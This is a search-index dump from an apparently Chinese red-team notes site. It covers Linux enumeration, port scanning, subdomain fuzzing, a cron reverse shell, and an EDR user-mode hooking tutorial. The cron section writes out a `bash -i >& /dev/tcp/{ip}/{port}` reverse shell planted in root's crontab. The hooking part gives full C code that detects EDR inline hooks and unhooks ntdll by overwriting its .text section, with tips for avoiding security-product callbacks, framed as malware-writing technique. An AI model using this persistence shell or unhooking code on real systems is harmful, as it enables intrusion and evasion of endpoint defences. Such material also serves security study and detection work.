[{"id":0,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Amass/","title":"Amass","section":"Docs","content":" Amass # https://github.com/owasp-amass/amass\n"},{"id":1,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Linux%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"Linux内部信息收集","section":"Docs","content":" Linux内部信息收集 # 查看系统版本 # cat /etc/issue cat /etc/*-release cat /etc/lsb-release cat /etc/redhat-release cat /proc/version uname -a 查看内核版本 # (cat /proc/version || uname -a ) 2\u0026gt;/dev/null lsb_release -a 2\u0026gt;/dev/null old, not by default on many systems cat /etc/os-release 2\u0026gt;/dev/null universal on modern systems proc 文件系统 # https://blog.csdn.net/cjdgg/article/details/119860355\n查看环境变量 # (env || set) 2\u0026gt;/dev/null 如果你对位于 PATH 变量中任何文件夹的写入权限，你就有可能劫持某些库或二进制文件\n查看用户信息 # id // 查看当前用户信息 who // 查看当前登录用户 w // 查看当前登录用户 last // 查看登录历史 cat /etc/passwd | cut -d: -f1// 查看所有用户 grep -v -E \u0026quot;^#\u0026quot; /etc/passwd | awk -F: '$3 == 0 { print $1}'// 查看所有 root 用户 awk -F: '($3 == \u0026quot;0\u0026quot;) {print}' /etc/passwd // 0 为 root 用户 cat /etc/sudoers // 查看 sudo 权限 查看网络信息 # ifconfig -a ip a cat /etc/network/interfaces cat /etc/sysconfig/network cat /etc/resolv.conf 查看有写权限的文件 # find / -writable -type -f 2\u0026gt;/dev/null find / -writable -type -f -not -path \u0026quot;/proc/*\u0026quot; -not -path \u0026quot;/sys/*\u0026quot; 2\u0026gt;/dev/null 查看 sudo 权限 # sudo -l 查看进程信息 # ps -ef ps aux top cat /etc/services 查看计划任务 # cat /etc/crontab 查看网络链接 # netstat -antup netstat -antpx ss -antup 查看防火墙 # iptables -L ufw status firewall-cmd --state cat /etc/sysconfig/iptables cat /etc/iptables.conf cat /etc/ufw/ufw.conf 查看系统服务 # systemctl list-units --type service --all systemctl list-unit-files systemctl list-units --type target 查看某一用户组中的用户 # getent group \u0026lt;groupname\u0026gt; getent group \u0026lt;gid\u0026gt; 查看某一用户的组 # groups \u0026lt;username\u0026gt; 查看邮件信息 # cat /var/mail/\u0026lt;username\u0026gt; 数据库信息 # mysql -u root -p\npsql -U postgres\nsqlite3 /path/to/db\n"},{"id":2,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F/","title":"主机扫描","section":"Docs","content":" nmap 扫描 # 命令 # 一（两）句话扫描 # ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) nmap -p$ports -Pn -sC -sV $IP 扫描网段 # sudo nmap -sn 172.16.200.0/24\n扫描操作系统 # sudo nmap -O ...\n扫描端口 # sudo nmap --min-rate 10000 -p- 172.16.200.131 -oA ports\n最低速率10000是权衡的结果，过快扫不准，过慢时间长，10000 是一般情况下适合的值 10000 是指每秒钟发送 10000 个数据包，即每秒钟扫描 10000 个端口 -p-表示 1-65535 端口 扫描 UDP 端口 # sudo nmap -sU --min-rate 10000 -p- 172.16.200.131 -oA UDPports\n-sU 使用 UDP 格式化端口信息 # grep open ports.nmap | awk -F'/' '{print $1}' | tr '\\n' ','\n扫描服务 # sudo nmap -sT -sV -sC -O -pxx,xx,xx 172.16.200.131\n-sT 使用 TCP -sV 扫描服务版本 -sC 使用默认脚本 -O 扫描操作系统信息 xx 表示扫描出来的端口 扫描漏洞 # sudo nmap --script=vuln -pxx,xx,xx 172.16.200.131\nLinux Shell 脚本 ping 扫描 # for i in {1..254};do ping -c 1 -W 1 172.16.200.$i | grep from;done ping 成功后会显示 from，所以使用 grep from；-c：发包数量；-W：超时时间\nLinux 伪设备扫描端口 # for i in {1..65535};do (echo \u0026lt; /dev/tcp/172.16.200.131/$i) \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; printf \u0026quot;[+] The Open Port is: %d\\n\u0026quot; \u0026quot;$i\u0026quot;;done\n\u0026amp;\u0026gt;/dev/null 把标准输出和标准错误输出都重定向到/dev/null，即不显示任何信息 \u0026amp;\u0026amp; 表示前面的命令执行成功后才执行后面的命令，即端口连接成功时才显示端口号 netcat 实现端口扫描 # 新版 kali 中装的是新版的 nc，要实现端口扫描，需要使用旧版 nc，命令为 nc.traditional nc.traditional -vv -z 172.16.200.131 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused\n-vv 选项表示 \u0026ldquo;very verbose\u0026rdquo;，即非常详细的输出模式。使用该选项会生成更详细的连接信息，包括连接的建立和关闭过程中的各种状态。 -z 选项用于进行端口扫描而不建立实际的连接。它会尝试连接指定的 IP 地址和端口，但不会发送实际的数据。 2\u0026gt;\u0026amp;1 是一种重定向语法，用于将标准错误输出（stderr）重定向到标准输出（stdout）； grep 的-v表示反向 Windows 批处理脚本扫描主机 # for /l %i in (1,1,254) do ping -n 1 -w 1 172.16.200.%i | find \u0026quot;TTL=\u0026quot;\n扫描某台主机的 IPv6 地址/其他地址 # IOXIDResolver sudo python3 ./IOXIDResolver.py -t xxx.xxx.xxx.xxx namp 扫描 IPv6 地址：-6\nsnmpwalk 扫描 # snmp 是一种网络管理协议，可以通过 snmpwalk 扫描主机信息 sudo snmpwalk -c public -v2c\n-c 指定 community -v2c 指定版本，有 v1、v2c、v3 "},{"id":3,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F/","title":"子域名扫描","section":"Docs","content":" 子域名扫描 # amass # amass enum -d example.com 通过虚构Host头扫描反代配置的其他域名 # wfuzz -c -u \u0026#34;http://example.com\u0026#34; -H \u0026#34;Host: FUZZ.example.com\u0026#34; -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt "},{"id":4,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","title":"定时任务","section":"Docs","content":" 定时任务反弹shell # crontab -l ls -al /etc/cron* /etc/at* cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; 各系统定时任务文件位置 # CentOS/RedHat：/var/spool/cron/ Ubuntu/Debian：/var/spool/cron/crontabs/ FreeBSD：/var/cron/tabs/ MacOS：/usr/lib/cron/tabs/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名\n反弹shell # echo \u0026#39;* * * * * /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/{ip}/{port} 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; /var/spool/cron/crontabs/root 解决ubuntu-crontab反弹shell失败的问题 # echo \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/{ip}/{port} 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; /tmp/shell.sh chmod +x /tmp/shell.sh echo \u0026#39;* * * * * /tmp/shell.sh\u0026#39; \u0026gt; /var/spool/cron/crontabs/root "},{"id":5,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/","title":"目录扫描","section":"Docs","content":" web 扫描 # feroxbuster # https://github.com/epi052/feroxbuster\n目录扫描器，支持递归，但线程太多，可能需要手动调整\ngobuster # https://github.com/OJ/gobuster\n目录扫描器\nV3n0M-Scanner # https://github.com/v3n0m-Scanner/V3n0M-Scanner\n针对 SQLi/XSS/LFI/RFI 和其他漏洞的流行测试扫描器 Python 3.6\nXSpear # https://github.com/hahwul/XSpear\nXSS 扫描\nPacker Fuzzer # https://github.com/rtcatc/Packer-Fuzzer\n一款针对 Webpack 等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具\n"},{"id":6,"href":"/docs/%E5%85%B6%E4%BB%96/Hooking/1.%E7%94%A8%E6%88%B7%E6%80%81Hooking%E4%BB%8B%E7%BB%8D/","title":"1.用户态 Hooking介绍","section":"Docs","content":" 1. 用户态Hooking介绍 # Hook，即钩子，在网络安全用语中，指的是拦截并且修改特定的 API 执行流程，通常用于 Debugging，逆向工程，游戏作弊，检测恶意软件行为。API Hook 将原有的 API 替换为自定义的以进行额外的检视，如果非恶意，则继而调用原有的 API，否则会被拦截。\n安全产品，例如 EDR，可能会实施 SSDT Hooking，IAT Hooking，内联 Hooking。不过对于 SSDT Hooking，因为是内核层的，虽然安全产品可以实施 SSDT Hooking 从而实现更彻底的检视，但也会被恶意软件用来实现文件、网络连接、注册表键等的隐藏。基于内核层的更改，无论目的是好是坏，都可能影响系统安全性、完整性、以及稳定性，因此微软后来引入了 PatchGuard 来阻止对内核的补丁。作为\u0026quot;补偿\u0026quot;，微软引入了我们之前简述过的内核回调，供安全产品进行内核层面的检视。\nIAT Hooking # 我们在 PE 小节介绍过 IAT 表了，IAT 表记录了映像文件所引用的模块以及其中的导出函数。我们在编写恶意软件时，调用 Win32 API 或者 NTAPI 的话，则会使 IAT 表中增加该 API 以及其所在的模块。\n以 calc 为例，我们使用 PE Bear 可以查看其在磁盘时候的 IAT 表，这时候 IAT 与 INT 是一致的，没有函数地址。但当 calc 被载入到内存中时，IAT 中会更新函数的地址。例如，我们在下图可以看到 KERNEL32 模块中第一个导入函数是 GetCurrentThreadId，当前 IAT 条目中的值是 HintName 表的 RVA。\n在 WinDBG 中，我们印证了，并且该条目的值被更新成了函数的地址。\n但如果，IAT 条目中的值被修改成安全产品模块的导出函数，那么是不是就意味着调用该函数的时候，安全产品都在检视了？IAT Hooking，就是这么一个原理。不过，如今安全产品，尤其是 EDR，主要使用下面要讲的内联 Hooking 进行函数调用检视。\n内联 Hooking # 内联 Hooking 是如今更主流的 Hooking 方案，EDR 通常会给 NTAPI 设置内联 Hook，因为 NTAPI 作为用户态与内核态的桥梁。内联 Hook 的特征为在 NTAPI 代码的 syscall 指令前，加入无条件的跳转，即 jmp 命令。\n下图是常被恶意软件所利用的 NtWriteVirtualMemory，其 Win32 API 是 WriteProcessMemory。我们可以看到，第 2 条指令跳转到了别处，这是被 hook 的特征。当然了，不同的 EDR hook 的函数可能所有不同(但肯定有一些 NTAPI 是都被 Hook 的)，hook 的指令位置也可能有所不同，例如有的 EDR 会覆盖 mov r10, rcx 这条指令。但是，跳转一定是发生在 syscall 指令之前，因为 syscall 指令的执行即意味着向内核态的过渡。\n而对于不怎么在恶意软件中被利用的良性 NTAPI，则没有被 hook 的迹象。\n实际上，对于大多数 NTAPI，代码都形如下图，这是 syscall 的格式。至于和上图相差的几条指令，至少在 x64 中，并非必须的，也就是有着下述这几条指令，就可以完成 syscall。\nmov r10, rcx mov rax, [SSN] syscall ret 在稍后的章节，我们会讲解如何绕过内联 Hook。\n"},{"id":7,"href":"/docs/%E5%85%B6%E4%BB%96/Hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81Hooking/","title":"2.绕过用户态 Hooking","section":"Docs","content":" 2. 绕过用户态Hooking # 在上个小节，我们讨论了 EDR 在用户态设置 Hook 的原理，那么相应地，我们可以根据这原理寻找间隙，实现对用户态 Hook 的绕过。截至目前，已经有多种方法绕过 Hook。不过，Hook 并非 EDR 的全部检测能力的来源，因此绕过 Hook 的这个过程本身可能就会被检测为恶意。不过无论如何，在这个小节，我们会过一下常见的一些用于绕过 Hook 的方法，以及它们的 IOC。在下个小节，我们会继续探讨绕过用户态 Hook 的方法，虽然会更加复杂一些。\n检测内联 Hook # 内联 Hook 的实施是在要 Hook 的 NTAPI 的 syscall stub 中的 syscall 指令之前用无条件跳转指令覆盖原有指令。不同的 EDR 可能会覆盖不同的指令，例如 CrowdStrike 覆盖的是 mov eax, SSN 这条指令，有的 EDR 覆盖的是 mov r10, rcx 这条指令。\n因此，代码的逻辑便很直接，逐一检查 syscall stub 的前 4 个字节。在代码里，我们通过 PEB Walking 的方法在不调用 LoadLibray，GetModuleHandle，GetProcAddress 函数的情况下可以获得 ntdll 模块的地址、给定函数的地址。这么做可以避免 LoadLibray，GetModuleHandle，GetProcAddress 这些函数在 IAT 中的显示。\n因为涉及对模块的解析，因此我们也会频繁用到 PE 文件相关的结构体。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; //Get module handle for ntdll and kernel32 at the same time void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } BOOL CheckFuncByName(IN HMODULE hModule, const CHAR * funcName) { PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return false; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return false; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName,pFunctionName)==0) { // Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8 if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); } else { printf(\u0026#34;NTAPI %s is hooked\\n\u0026#34;, funcName); return true; } return false; } } return false; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); CheckFuncByName(ntdll,\u0026#34;NtAllocateVirtualMemory\u0026#34;); CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); CheckFuncByName(ntdll, \u0026#34;NtReadVirtualMemory\u0026#34;); CheckFuncByName(ntdll, \u0026#34;NtWriteVirtualMemory\u0026#34;); return 0; } 编译后，使用 WinDBG 来调试该程序，通过手动修改 NtOpenProcess 的第一条指令来模拟 hook。程序也成功地检测出 NtOpenProcess API 的指令被纂改。\n替换 .text 节 # 我们知道 PE 文件的 .text 节是可执行代码的区域，权限是 RX。既然特定 NTAPI 被 hook 了，只要用干净的 ntdll 的 .text 节来覆盖，那么我们就会得到干净的代码，自然可以实现 unhook。\n因此，我们首先要获得载入的 ntdll 模块的地址，这个我们已经用代码实现了。然后我们从磁盘读取 ntdll 文件，并存储在缓冲区中。需要注意的是，存储在缓冲区中的 ntdll 的内容是基于磁盘中的形式，即尚未映射到内存中。这样，我们有了 2 份不同的 ntdll 的地址，一份是被 hook 的，一份是干净的；一份是映射在内存中的，一份是基于磁盘形式的。因此，在将干净 ntdll 文件中的 .text 节覆盖被 hook 的 ntdll 的 .text 节时，我们需要稍加注意 PointerOfRawData 与 VirtualAddress，SizeOfRawData 与 VirtualSize。\ntypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 以下面截图中的 ntdll 为例，在本地磁盘时，文件偏移为 0x400，尺寸为 0x11920。当被载入至内存时，RVA 是 0x1000，尺寸为 0x1190ce。我们需要注意到这差异。\n因为两者 .text 节的尺寸有轻微不同，为了保险起见，我们适用尺寸更大的 .text 节来覆盖。之所以考虑这点，我是担心如果干净的 .text 节尺寸更小，那么没有完全覆盖，载入的 ntdll 的代码区还会有少量代码残留，可能在特定情况下导致意想不到的结果。尽管在本案例中干净的代码区尺寸更大，但在其他的操作系统版本可能是相反的情况，所以我们依旧需要考虑到。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;string.h\u0026gt; void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } BOOL CheckFuncByName(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return false; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return false; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { // Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8 if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); } else { printf(\u0026#34;NTAPI %s is hooked\\n\u0026#34;, funcName); return true; } return false; } } return false; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); HANDLE hFile = CreateFileA(\u0026#34;C:\\\\Windows\\\\System32\\\\ntdll.dll\u0026#34;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf(\u0026#34;[!] CreateFileA Failed With Error : %d \\n\\n\u0026#34;, GetLastError()); return -1; } DWORD dwFileLen = GetFileSize(hFile, NULL); DWORD dwNumberOfBytesRead; PVOID pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen); if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, \u0026amp;dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) { printf(\u0026#34;[!] ReadFile Failed With Error : %d \\n\\n\u0026#34;, GetLastError()); return -1; } if (hFile) { CloseHandle(hFile); } PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdll; PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll + hookedDosHeader-\u0026gt;e_lfanew); PIMAGE_DOS_HEADER CleanDosHeader = (PIMAGE_DOS_HEADER)pNtdllBuffer; PIMAGE_NT_HEADERS CleanNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pNtdllBuffer + CleanDosHeader-\u0026gt;e_lfanew); for (WORD i = 0; i \u0026lt; hookedNtHeader-\u0026gt;FileHeader.NumberOfSections; i++) { PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)); PIMAGE_SECTION_HEADER CleanSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CleanNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)); if (!strcmp((char*)hookedSectionHeader-\u0026gt;Name, (char*)\u0026#34;.text\u0026#34;)) { LPVOID hookedTextSection = (LPVOID)((DWORD_PTR)ntdll + (DWORD_PTR)hookedSectionHeader-\u0026gt;VirtualAddress); LPVOID CleanTextSection = (LPVOID)((DWORD_PTR)pNtdllBuffer + (DWORD_PTR)CleanSectionHeader-\u0026gt;PointerToRawData); size_t size_TextSection = (hookedSectionHeader-\u0026gt;Misc.VirtualSize \u0026gt; CleanSectionHeader-\u0026gt;SizeOfRawData) ? hookedSectionHeader-\u0026gt;Misc.VirtualSize : CleanSectionHeader-\u0026gt;SizeOfRawData; DWORD oldProtection = 0; bool isProtected = VirtualProtect(hookedTextSection, size_TextSection, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtection); memcpy(hookedTextSection, CleanTextSection, size_TextSection); isProtected = VirtualProtect(hookedTextSection, size_TextSection, oldProtection, \u0026amp;oldProtection); } } CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); return 0; } 编译后，我们使用 WinDBG 来调试该程序，为了模拟 hook，我们手动修改 NtOpenProcess API 的第一条指令，并且确认了该修改是成功的。在程序运行结束后，查看该 API，发现代码被恢复成原有的了。因此，通过替换 .text 节，我们可以实现对用户态 Hook 的绕过。\n值得一提的是，我发现其他利用此方法的代码里，作者们用了 CreateFileMapping 与 MapViewOfFile 来将干净的 ntdll 载入至内存中。\nHANDLE CreateFileMappingA( [in] HANDLE hFile, [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes, [in] DWORD flProtect, [in] DWORD dwMaximumSizeHigh, [in] DWORD dwMaximumSizeLow, [in, optional] LPCSTR lpName ); LPVOID MapViewOfFile( [in] HANDLE hFileMappingObject, [in] DWORD dwDesiredAccess, [in] DWORD dwFileOffsetHigh, [in] DWORD dwFileOffsetLow, [in] SIZE_T dwNumberOfBytesToMap ); 使用这些 WinAPI 时，因为映像被映射到内存中，因此 Windows 加载器会适用变更的对齐系数，导致 .text 的偏移也不同。如果 CreateFileMappingA 的 flProtext 参数没有包含 SEC_IMAGE 或 SEC_IMAGE_NO_EXECUTE 标志，则不会适用新的对齐。但SEC_IMAGE_NO_EXECUTE 标志还是会更好一些，因为它不会触发 PsSetLoadImageNotifyRoutine 回调。这意味着当 ntdll.dll 被映射到内存时，使用此标志不会提醒接收映像载入通知例程的安全产品。\nhSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL); if (hSection == NULL) { printf(\u0026#34;[!] CreateFileMappingA Failed With Error : %d \\n\u0026#34;, GetLastError()); return -1; } // mapping the view of file of ntdll.dll pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL); if (pNtdllBuffer == NULL) { printf(\u0026#34;[!] MapViewOfFile Failed With Error : %d \\n\u0026#34;, GetLastError()); return -1; } 好，我们来讨论一下该方法存在的 IOC：\n从磁盘中读取 ntdll.dll 对于良性程序来说比较可疑 在 unhook 之前，我们需要用到一些敏感的函数，例如 VirtualProtect，WriteProcessMemory(可用于代替 VirtualProtect 和 memcpy 组合) 等 EDR 可以验证载入的 ntdll 的完整性以判断是否遭到了纂改 拓展\n我们是从磁盘中读取 ntdll，其实我们还可以从 KnownDlls 目录、远程 web 服务器上读取。请查询资料以及所需的 API 的用法，进行实现作为练习。\n补丁 NTAPI # 相比替换整个 ntdll 模块的 .text 节，我们可以选择只补丁我们所需的且被 hook 的函数，这样，补丁的动作会相对小一些。相比之前的代码，我们可以硬编码或者动态地获得目标 NTAPI 的 syscall stub 指令字节，其实区别只在于 SSN。至于如何动态地获取 SSN，我们会在下一小节进行讲解，因此这里我们就硬编码 NtOpenProcess 的 syscall stub 好了。\n需要略加注意的是，对于给定的函数，其地址很大概率不是与内存页对齐的，幸运的是，像 VirtualAlloc、VirtualProtect 这类函数会自动帮我们适用向下最近的页的地址。\n对于代码，我们只需要增加硬编码的 NTAPI 的 syscall stub，以及对 CheckFuncByName 稍加修改。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;string.h\u0026gt; void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } BOOL CheckFuncByName(IN HMODULE hModule, const CHAR* funcName, unsigned char* cleanNTAPI) { PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return false; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return false; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { // Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8 if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); } else { 